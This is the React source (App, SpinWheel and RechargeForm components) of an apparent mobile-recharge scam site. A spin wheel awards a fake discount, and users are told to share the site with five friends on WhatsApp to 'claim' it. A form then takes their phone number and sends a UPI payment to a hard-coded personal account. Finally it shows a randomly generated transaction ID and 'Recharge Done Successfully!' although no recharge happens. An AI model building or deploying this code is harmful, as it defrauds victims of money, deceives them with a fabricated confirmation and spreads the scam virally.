// App.jsx import React, { useState } from 'react'; import './App.css';

import RechargeForm from './RechargeForm'; import SpinWheel from './SpinWheel';

function App() { const [discount, setDiscount] = useState(null); const [shared, setShared] = useState(false);

return ( <div className="app-container"> <h1 className="header">Lucky Recharge Wheel</h1> {!discount ? ( <SpinWheel setDiscount={setDiscount} /> ) : !shared ? ( <div className="share-section"> <p>You won ₹{discount} OFF! Share with 5 friends to claim.</p> <a href={https://wa.me/?text=I%20won%20₹${discount}%20Recharge%20Discount%20on%20this%20site!%20Check%20yours%20now!} target="_blank" rel="noopener noreferrer" className="share-btn" onClick={() => setShared(true)} > Share on WhatsApp </a> </div> ) : ( <RechargeForm discount={discount} /> )} </div> ); }

export default App;

// SpinWheel.jsx import React, { useState } from 'react'; import './SpinWheel.css';

const prizes = [10, 20, 50, 100, 200, 500];

function SpinWheel({ setDiscount }) { const [spinning, setSpinning] = useState(false);

const handleSpin = () => { setSpinning(true); setTimeout(() => { const result = prizes[Math.floor(Math.random() * prizes.length)]; setDiscount(result); setSpinning(false); }, 3000); };

return ( <div className="wheel-container"> <div className={wheel ${spinning ? 'spin' : ''}}></div> <button onClick={handleSpin} disabled={spinning} className="spin-btn"> {spinning ? 'Spinning...' : 'Spin the Wheel'} </button> </div> ); }

export default SpinWheel;

// RechargeForm.jsx import React, { useState } from 'react'; import './RechargeForm.css';

function RechargeForm({ discount }) { const [submitted, setSubmitted] = useState(false); const [plan, setPlan] = useState('199');

const handleSubmit = (e) => { e.preventDefault(); setSubmitted(true); };

const finalAmount = Math.max(0, parseInt(plan) - discount);

if (submitted) { return ( <div className="confirmation"> <h2>Redirecting to UPI...</h2> <a href={upi://pay?pa=9598023701@ybl&pn=Recharge&cu=INR&am=${finalAmount}} className="upi-btn" > Click here if not redirected </a> <p>Transaction ID: TXN{Math.floor(Math.random() * 90000000 + 10000000)}</p> <h3>Recharge Done Successfully!</h3> </div> ); }

return ( <form onSubmit={handleSubmit} className="recharge-form"> <input type="tel" placeholder="Mobile Number" required maxLength="10" /> <select required> <option value="Jio">Jio</option> <option value="Airtel">Airtel</option> <option value="VI">VI</option> </select> <input type="number" placeholder="Recharge Plan" required value={plan} onChange={(e) => setPlan(e.target.value)} /> <input type="text" value={OFF${discount}} readOnly /> <button type="submit">Recharge Now - ₹{finalAmount}</button> </form> ); }

export default RechargeForm;

  
